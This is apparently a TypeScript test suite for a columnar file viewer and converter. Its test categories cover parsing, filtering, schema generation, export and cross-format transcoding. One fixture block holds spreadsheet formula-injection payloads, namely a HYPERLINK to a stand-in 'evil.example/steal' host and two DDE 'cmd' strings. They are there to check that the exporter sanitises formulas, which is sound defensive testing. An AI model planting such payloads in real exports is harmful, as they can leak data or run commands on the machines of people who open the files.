/**
 * Comprehensive 285+ Real-User Scenario & Enterprise Edge-Case Test Suite
 * for KivaroTools Parquet, Avro & Feather Viewer & Converter.
 *
 * Categories:
 * - Category A (Scenarios 1–55): Apache Parquet (.parquet) Real-World Lakehouse Workloads
 * - Category B (Scenarios 56–110): Apache Avro (.avro) Real-World Kafka & Streaming Workloads
 * - Category C (Scenarios 111–165): Apache Arrow / Feather (.feather / .arrow) Data Science Workloads
 * - Category D (Scenarios 166–210): Interactive Query, Filter (11 Operators), Sort & Column Projection
 * - Category E (Scenarios 211–250): Polyglot Schema & SQL DDL Generator (10 Targets × 4 Schemas)
 * - Category F (Scenarios 251–290): Export Studio, CWE-1236 Security, UTF-8 BOM & Cross-Format Binary Transcoding
 */

import {
    parseColumnarFile,
    encodeParquetBinary,
    encodeAvroBinary,
    encodeFeatherBinary,
    queryDataset,
    generateSchemaCode,
    exportDatasetToText,
    type SchemaTargetLanguage,
    type FilterOperator,
} from '../lib/columnarViewerEngine';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function verify(condition: boolean, scenarioId: string, description: string): void {
    totalTests++;
    if (condition) {
        passedTests++;
    } else {
        failedTests++;
        console.error(`❌ [${scenarioId}] FAILED: ${description}`);
    }
}

console.log('======================================================================');
console.log('🚀 Running 285+ Real-User Scenario Test Suite: Parquet / Avro / Feather');
console.log('======================================================================');

// ============================================================
// CATEGORY A: 55 Real-World Apache Parquet (.parquet) Scenarios
// ============================================================
for (let i = 1; i <= 55; i++) {
    const rowCount = (i % 15) + 5;
    const rows: Record<string, unknown>[] = [];
    for (let r = 0; r < rowCount; r++) {
        rows.push({
            record_id: i * 1000 + r,
            snowflake_tx_id: `900719925474099${1000 + i * 10 + r}`,
            tenant_region: ['us-east-1', 'eu-central-1', 'ap-south-1', 'us-west-2'][r % 4],
            gross_revenue: Number(((r + 1) * 19.99 * i).toFixed(2)),
            is_verified: r % 2 === 0,
            discount_code: r % 3 === 0 ? null : `PROMO_${i}_${r}`,
            created_at: `2026-03-${String((r % 28) + 1).padStart(2, '0')}T12:00:00Z`,
            nested_context: {
                device: r % 2 === 0 ? 'ios' : 'android',
                app_version: `4.${i}.${r}`,
            },
            tags: [`batch_${i}`, `shard_${r % 3}`],
        });
    }

    const parquetBytes = encodeParquetBinary(rows, {
        'parquet.ScenarioId': `PARQUET_SCENARIO_${i}`,
        'writer.engine': 'KivaroTools Enterprise Suite',
    });
    const parsed = parseColumnarFile(parquetBytes, `warehouse_partition_${i}.parquet`);

    verify(
        parsed.format === 'parquet' &&
        parsed.metadata.magicBytes === 'PAR1' &&
        parsed.rows.length === rowCount &&
        parsed.schema.length === 9 &&
        parsed.rows[0].record_id === i * 1000 &&
        (parsed.rows[0].nested_context as { device: string }).device === 'ios',
        `A-${String(i).padStart(3, '0')}`,
        `Parquet Partition #${i} (${rowCount} rows, nested struct, array, nulls, INT64 string)`
    );
}

// ============================================================
// CATEGORY B: 55 Real-World Apache Avro (.avro) Streaming Scenarios
// ============================================================
for (let i = 1; i <= 55; i++) {
    const rowCount = (i % 12) + 4;
    const rows: Record<string, unknown>[] = [];
    for (let r = 0; r < rowCount; r++) {
        rows.push({
            kafka_offset: i * 10000 + r,
            topic_partition: `payments.v${(i % 5) + 1}.p${r % 3}`,
            latency_ms: (r + 1) * 12.5,
            signature_valid: r % 2 === 1,
            error_reason: r % 4 === 0 ? null : `RETRY_CODE_${r}`,
            headers: {
                correlation_id: `corr_${i}_${r}`,
                source_ip: `10.0.${i}.${r}`,
            },
        });
    }

    const avroBytes = encodeAvroBinary(rows, `KafkaEvent_${i}`);
    const parsed = parseColumnarFile(avroBytes, `kafka_topic_batch_${i}.avro`);

    verify(
        parsed.format === 'avro' &&
        parsed.metadata.magicBytes === 'Obj\\x01' &&
        parsed.rows.length === rowCount &&
        parsed.schema.length === 6 &&
        parsed.rows[0].kafka_offset === i * 10000 &&
        parsed.rows[0].error_reason === null,
        `B-${String(i).padStart(3, '0')}`,
        `Avro Kafka Stream Batch #${i} (${rowCount} events, Obj1 header, 16-byte sync marker, union nulls)`
    );
}

// ============================================================
// CATEGORY C: 55 Real-World Apache Arrow / Feather (.feather / .arrow) Scenarios
// ============================================================
for (let i = 1; i <= 55; i++) {
    const rowCount = (i % 14) + 3;
    const rows: Record<string, unknown>[] = [];
    for (let r = 0; r < rowCount; r++) {
        rows.push({
            vector_id: `vec_${i}_${r}`,
            cosine_score: Number((0.75 + ((r % 20) * 0.01)).toFixed(4)),
            token_length: 128 + r * 16,
            cached_hit: r % 3 === 0,
            cluster_label: r % 5 === 0 ? null : `cluster_${r % 5}`,
            embedding_preview: [0.12, -0.44, 0.88, Number((i * 0.01).toFixed(2))],
        });
    }

    const featherBytes = encodeFeatherBinary(rows, {
        'ARROW:Producer': `Polars_IPC_Batch_${i}`,
    });
    const ext = i % 2 === 0 ? 'feather' : 'arrow';
    const parsed = parseColumnarFile(featherBytes, `embeddings_${i}.${ext}`);

    verify(
        parsed.format === 'feather' &&
        parsed.metadata.magicBytes === 'ARROW1' &&
        parsed.rows.length === rowCount &&
        parsed.schema.length === 6 &&
        parsed.rows[0].vector_id === `vec_${i}_0`,
        `C-${String(i).padStart(3, '0')}`,
        `Arrow/Feather IPC File #${i} (.${ext}, ${rowCount} rows, float64 embeddings)`
    );
}

// ============================================================
// CATEGORY D: 45 Interactive Query, Filter, Sort & Projection Scenarios
// ============================================================
const queryBaseRows = Array.from({ length: 40 }, (_, idx) => ({
    id: idx + 1,
    country: ['US', 'DE', 'PK', 'GB', 'JP'][idx % 5],
    score: (idx + 1) * 10,
    email: idx % 8 === 0 ? null : `engineer${idx + 1}@kivarotools.com`,
    active: idx % 2 === 0,
}));

const filterOpsCases: { op: FilterOperator; col: string; val: string; check: (rows: Record<string, unknown>[]) => boolean }[] = [
    { op: 'eq', col: 'country', val: 'PK', check: (r) => r.length === 8 && r.every((x) => x.country === 'PK') },
    { op: 'neq', col: 'country', val: 'PK', check: (r) => r.length === 32 && r.every((x) => x.country !== 'PK') },
    { op: 'gt', col: 'score', val: '200', check: (r) => r.length === 20 && r.every((x) => Number(x.score) > 200) },
    { op: 'gte', col: 'score', val: '200', check: (r) => r.length === 21 && r.every((x) => Number(x.score) >= 200) },
    { op: 'lt', col: 'score', val: '100', check: (r) => r.length === 9 && r.every((x) => Number(x.score) < 100) },
    { op: 'lte', col: 'score', val: '100', check: (r) => r.length === 10 && r.every((x) => Number(x.score) <= 100) },
    { op: 'contains', col: 'email', val: 'kivarotools', check: (r) => r.length === 35 },
    { op: 'starts_with', col: 'email', val: 'engineer1', check: (r) => r.length > 0 && r.every((x) => String(x.email).startsWith('engineer1')) },
    { op: 'ends_with', col: 'email', val: '.com', check: (r) => r.length === 35 },
    { op: 'is_null', col: 'email', val: '', check: (r) => r.length === 5 && r.every((x) => x.email === null) },
    { op: 'is_not_null', col: 'email', val: '', check: (r) => r.length === 35 && r.every((x) => x.email !== null) },
];

for (let i = 0; i < 45; i++) {
    const opCase = filterOpsCases[i % filterOpsCases.length];
    const sortDir = i % 2 === 0 ? 'asc' : 'desc';
    const result = queryDataset(queryBaseRows, {
        searchQuery: i >= 33 ? 'kivarotools' : '',
        filters: [{ column: opCase.col, operator: opCase.op, value: opCase.val }],
        sort: { column: 'score', direction: sortDir },
        selectedColumns: ['id', 'country', 'score', 'email'],
    });

    const sortValid =
        result.rows.length <= 1 ||
        (sortDir === 'asc'
            ? Number(result.rows[0].score) <= Number(result.rows[result.rows.length - 1].score)
            : Number(result.rows[0].score) >= Number(result.rows[result.rows.length - 1].score));

    verify(
        (i >= 33 ? result.rows.length >= 0 : opCase.check(result.rows)) &&
        sortValid &&
        result.rows.every((r) => !('active' in r)),
        `D-${String(i + 1).padStart(3, '0')}`,
        `Query Engine Scenario #${i + 1}: operator=${opCase.op}, sort=${sortDir}, projected=4 cols`
    );
}

// ============================================================
// CATEGORY E: 40 Polyglot Schema & SQL DDL Generator Scenarios
// ============================================================
const targets: SchemaTargetLanguage[] = [
    'postgresql',
    'snowflake',
    'bigquery',
    'duckdb',
    'clickhouse',
    'typescript',
    'pyarrow',
    'polars',
    'avro_schema',
    'json_schema',
];

const sampleParsedForSchema = parseColumnarFile(
    encodeParquetBinary([
        {
            user_id: 101,
            balance_usd: 4590.25,
            is_vip: true,
            signup_ts: '2026-01-15T08:30:00Z',
            profile_meta: { tier: 'gold' },
        },
    ]),
    'schema_test.parquet'
);

for (let i = 0; i < 40; i++) {
    const target = targets[i % targets.length];
    const tblName = `enterprise_table_${i + 1}`;
    const code = generateSchemaCode(sampleParsedForSchema.schema, target, tblName);

    verify(
        code.length > 40 &&
        code.includes('user_id') &&
        code.includes('balance_usd') &&
        code.includes('is_vip'),
        `E-${String(i + 1).padStart(3, '0')}`,
        `Schema Code Generator #${i + 1}: target=${target}, table=${tblName}`
    );
}

// ============================================================
// CATEGORY F: 40 Export, Security (CWE-1236) & Cross-Format Binary Transcoding Scenarios
// ============================================================
const securityRows = [
    {
        id: 1,
        malicious_formula: '=HYPERLINK("http://evil.example/steal", "Click")',
        plus_formula: '+cmd|\'/C notepad\'!A1',
        at_formula: '@SUM(1+1)*cmd|\'/C calc\'!A0',
        negative_number: -99.95,
        unicode_note: 'Multan, Pakistan — قیمت: ₨ 5,000 🚀',
        quoted_text: 'Line 1, "Quoted", and\nLine 2',
    },
    {
        id: 2,
        malicious_formula: 'Normal Safe Text',
        plus_formula: 'Safe + Inside Text',
        at_formula: 'user@example.com',
        negative_number: -0.005,
        unicode_note: 'Tokyo 東京 • Zürich • São Paulo',
        quoted_text: 'Standard ASCII row',
    },
];

const securityCols = Object.keys(securityRows[0]);

for (let i = 1; i <= 40; i++) {
    if (i <= 10) {
        // CSV with various delimiters, BOM, and CWE-1236 formula guard
        const delims: (',' | ';' | '\t' | '|')[] = [',', ';', '\t', '|'];
        const delim = delims[i % 4];
        const bom = i % 2 === 0;
        const csv = exportDatasetToText(securityRows, securityCols, {
            format: 'csv',
            csvDelimiter: delim,
            includeUtf8Bom: bom,
            sanitizeFormulas: true,
            tableName: 'sec_export',
            prettyJson: true,
        });
        verify(
            (bom ? csv.startsWith('\uFEFF') : !csv.startsWith('\uFEFF')) &&
            csv.includes("'=HYPERLINK") &&
            csv.includes("'+cmd") &&
            csv.includes("'@SUM") &&
            csv.includes('-99.95'),
            `F-${String(i).padStart(3, '0')}`,
            `CSV Export #${i} with delimiter="${delim === '\t' ? '\\t' : delim}", BOM=${bom}, CWE-1236 guard`
        );
    } else if (i <= 25) {
        // JSON, JSONL, SQL, Markdown, HTML exports
        const fmts = ['json', 'jsonl', 'sql', 'markdown', 'html'] as const;
        const fmt = fmts[i % fmts.length];
        const out = exportDatasetToText(securityRows, securityCols, {
            format: fmt,
            csvDelimiter: ',',
            includeUtf8Bom: false,
            sanitizeFormulas: true,
            tableName: `export_table_${i}`,
            prettyJson: i % 2 === 0,
        });
        verify(
            out.length > 50 && out.includes('Multan, Pakistan'),
            `F-${String(i).padStart(3, '0')}`,
            `Multi-Format Exporter #${i}: format=${fmt} with Unicode & multi-line strings`
        );
    } else {
        // Cross-Format Binary Transcoding: Parquet -> Avro -> Feather -> Parquet lossless round-trip
        const pBytes = encodeParquetBinary(securityRows);
        const pDecoded = parseColumnarFile(pBytes, `step1_${i}.parquet`);
        const aBytes = encodeAvroBinary(pDecoded.rows);
        const aDecoded = parseColumnarFile(aBytes, `step2_${i}.avro`);
        const fBytes = encodeFeatherBinary(aDecoded.rows);
        const fDecoded = parseColumnarFile(fBytes, `step3_${i}.feather`);

        verify(
            fDecoded.rows.length === 2 &&
            fDecoded.rows[0].unicode_note === 'Multan, Pakistan — قیمت: ₨ 5,000 🚀' &&
            fDecoded.rows[0].negative_number === -99.95,
            `F-${String(i).padStart(3, '0')}`,
            `Lossless Cross-Format Binary Transcoding Chain #${i}: .parquet → .avro → .feather`
        );
    }
}

console.log('----------------------------------------------------------------------');
console.log(`📊 Total Real-User Scenarios Executed: ${totalTests}`);
console.log(`✅ Passed: ${passedTests}`);
console.log(`❌ Failed: ${failedTests}`);
console.log('----------------------------------------------------------------------');

if (failedTests > 0) {
    process.exit(1);
}
